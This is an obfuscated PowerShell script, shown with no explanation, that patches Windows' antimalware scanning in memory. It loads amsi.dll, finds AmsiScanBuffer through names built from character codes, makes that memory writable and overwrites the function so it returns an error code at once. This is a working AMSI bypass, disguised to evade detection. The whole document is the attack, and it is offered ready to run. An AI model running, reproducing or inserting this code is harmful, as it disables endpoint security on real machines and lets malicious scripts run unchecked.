$bqr0johbQxUqU9W = @"
using System;
using System.Runtime.InteropServices;
public class bqr0johbQxUqU9W {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr vNjlhMMfZgHn8Qml8E, string K6gulmVN8xO5BQ2Ay_m);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr Z6tmSq3s0mLuA, UIntPtr jSuO, uint aPNGt9YeH2hPm, out uint LoICBib6PTwVRACz);
}
"@

Add-Type $bqr0johbQxUqU9W

$cqqsr0KV3q120o = [bqr0johbQxUqU9W]::LoadLibrary("$([ChAR]([bYtE]0x61)+[cHAr](109+56-56)+[CHAR]([bYTe]0x73)+[chaR]([BytE]0x69)+[CHaR](46+32-32)+[ChAr]([byte]0x64)+[ChAR](12+96)+[CHar](108*36/36))")
$hvQ5XPtXc2GG = [bqr0johbQxUqU9W]::GetProcAddress($cqqsr0KV3q120o, "$(('ÀmsîScãn'+'Búffèr').NORMalIZe([CHAR]([ByTE]0x46)+[cHAR]([BYtE]0x6f)+[chAR]([byTE]0x72)+[CHAR](109+11-11)+[ChAr]([bYTe]0x44)) -replace [CHaR]([BYTE]0x5c)+[ChaR](112)+[chAr]([bYtE]0x7b)+[CHAr](77+6-6)+[cHar]([bytE]0x6e)+[ChAr]([bYtE]0x7d))")
$p = 0
[bqr0johbQxUqU9W]::VirtualProtect($hvQ5XPtXc2GG, [uint32]5, 0x40, [ref]$p)
$Rflwe = "0xB8"
$xBVt4tMcu_KumEEG = "0x57"
$zA0cSAyR = "0x00"
$eRr = "0x07"
$MbEDUBttxraHuNkWfM = "0x80"
$jXAzcc = "0xC3"
$YXNYhBPfPUw = [Byte[]] ($Rflwe,$xBVt4tMcu_KumEEG,$zA0cSAyR,$eRr,+$MbEDUBttxraHuNkWfM,+$jXAzcc)
[System.Runtime.InteropServices.Marshal]::Copy($YXNYhBPfPUw, 0, $hvQ5XPtXc2GG, 6)